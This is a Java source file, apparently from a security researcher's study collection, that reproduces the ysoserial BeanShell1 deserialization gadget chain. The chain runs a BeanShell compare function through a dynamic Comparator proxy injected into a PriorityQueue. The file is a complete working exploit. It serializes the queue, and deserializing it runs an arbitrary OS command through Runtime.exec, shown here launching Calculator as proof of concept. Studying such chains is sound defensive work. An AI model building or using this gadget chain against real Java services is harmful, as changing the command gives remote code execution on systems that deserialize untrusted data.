package org.su18.serialize.ysoserial.BeanShell;


import bsh.Interpreter;
import bsh.XThis;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * 参考 https://www.guildhab.top/2020/10/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e14-%e8%a7%a3%e5%af%86-ysoserial-beanshell1-pop-chains/
 *
 * @author su18
 */
public class BeanShell {

	public static void main(String[] args) throws Exception {

		// compare 函数，需要接受两个参数，返回 Integer 类型
		String func = "compare(Object whatever,Object dontCare) {java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\");return new Integer(1);}";

		// 将 compare 方法注册至 Interpreter 实例上下文中
		Interpreter i = new Interpreter();
		i.eval(func);

		// 创建 XThis 对象，获取其 invocationHandler
		XThis xt           = new XThis(i.getNameSpace(), i);
		Field handlerField = XThis.class.getDeclaredField("invocationHandler");
		handlerField.setAccessible(true);
		InvocationHandler handler = (InvocationHandler) handlerField.get(xt);

		// 使用 XThis$Handler 为 Comparator 创建动态代理
		Comparator<Object> comparator = (Comparator<Object>) Proxy.newProxyInstance(
				Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

		// 在初始化时不带入 comparator
		PriorityQueue<Object> queue = new PriorityQueue<>(2);
		queue.add("1");
		queue.add("2");

		Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
		field.setAccessible(true);
		field.set(queue, comparator);

		SerializeUtil.writeObjectToFile(queue);
		SerializeUtil.readFileObject();
	}

}
